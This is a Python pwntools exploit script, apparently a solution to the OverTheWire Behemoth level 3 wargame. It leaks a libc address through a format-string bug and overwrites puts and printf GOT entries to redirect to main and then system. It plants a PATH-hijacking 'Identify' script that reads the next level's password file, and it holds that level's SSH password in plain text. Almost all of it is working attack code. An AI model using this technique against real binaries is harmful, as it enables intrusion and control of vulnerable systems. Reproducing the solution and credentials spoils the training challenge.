#!/usr/bin/env python3
import os
from pwn import *

elf = context.binary = ELF("behemoth3")
libc = ELF(b"../libc.so.6") # elf.libc broke again


HOST = "behemoth.labs.overthewire.org"
USER = "behemoth3"
PORT = 2221
PASSWORD = "nieteidiel"


gs = '''
break main
break *0x080484B0
break *0x080484CC
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)

    elif args.REMOTE:
        return remote((HOST, PORT))

    elif args.SSH:
      tunnel = ssh(
      user=USER,
      host=HOST,
      port=PORT,
      password=PASSWORD)

      commands = [
      "cd /tmp",
      r"cd $(mktemp -d)",
      "pwd",
      r"echo -e '#!/bin/sh\n/bin/cat /etc/behemoth_pass/behemoth4' >> Identify",
      "chmod 777 Identify",
      "chmod 777 ."]

      s = tunnel.system(' ; '.join(commands))
      tmp_dir = s.recv(timeout=1)[:-1].decode()
      # print(tmp_dir)
      return tunnel.process("/behemoth/behemoth3", 
        env={"PATH":f"{tmp_dir}:/usr/local/bin:/usr/bin"})

    else:
      return process(elf.path)

io = start()
io.timeout = 0.1

# first we leak the libc address using the fact main returns to __libc_start_main
# upon debugging we discover it returns to __libc_start_main+241
# we can now reveal this address by examining the 50th parameter to printf using %52$p
# we then subtract 241 to get the address of __libc_start_main
# we then use readelf on libc to find the offset from its base. we get its 0x18190
# now we have the base of libc, so time to return back to the start of main. we use %n to overwrite puts at .got.plt point back to main.
# now we do this again, but this time overwrite printf@plt with system@libc
# lastly, we will create a file named Identify, chmod 777 it, write #!/bin/sh\n sh in it so when we run system on it we get a shell, and add the current dir to path.


# EXPLOIT CODE HERE:
# =============================================================================

puts_got_plt = 0x080497AC
printf_got_plt = 0x080497A4
main_addr = 0x0804847B

def get_eip_control(overwrite_addr, ret_addr, is_second = False):

  exploit  = p32(overwrite_addr)
  exploit += p32(overwrite_addr+2)

  n0 = len(exploit)
  if is_second:
    n0 -= 1            # when debugging without this, i was off by 1 on the second payload. not sure why though.
                       # i placed the -1 here because it seemed the most natural.

  exploit += b" %52$p" # leak __libc_start_main

  n1 = u32(p32(ret_addr)[:2]+b"\x00\x00")
  exploit += ("%{}x".format(n1 - n0 - 11)).encode() # the -11 is the address of __libc_start_main and the space before it.
  exploit += b"%1$n"
  n2 = u32(p32(ret_addr)[2:]+b"\x00\x00")
  if n2 < n1:
    n2 = 0x10000 + n2
  if n2 > n1:
    exploit += ("%{}x".format(n2-n1)).encode()
  exploit += b"%2$n"

  return exploit

outputs = []
outputs.append(io.recvuntil("yourself: "))

exploit = get_eip_control(puts_got_plt, main_addr)
io.sendline(exploit)

# io.interactive()
res = io.recvuntil(" 0x")

outputs.append(res)

if not args.NOASLR:
  __libc_start_main_246 = int(io.recv(8), 16)
  outputs.append(hex(__libc_start_main_246))
else:
  __libc_start_main_246 = 0xf7e2a286 # without ASLR for debugging purposes

io.recvline() # clear io buffer after printf

libc.address = 0
# libc.address = 0xf7e12000
libc.address = __libc_start_main_246-246-libc.sym.__libc_start_main
print("libc address is: " + hex(libc.address))
system_addr = libc.sym.system   # this is libc.address + offset of system in libc, which can be read with readelf -s <path2libc> | grep system

print("system address is: " + hex(system_addr))
exploit2  = get_eip_control(printf_got_plt, system_addr, True)

# open("Identify", "w").write("#!/bin/sh" + "\n" + "sh")
# os.system("chmod +x Identify")

io.sendline(exploit2)


# =============================================================================

# open("exp", "wb").write(exploit + b'\n' + exploit2)

if args.LOG:
  for output in outputs:
    print(output)

io.interactive()
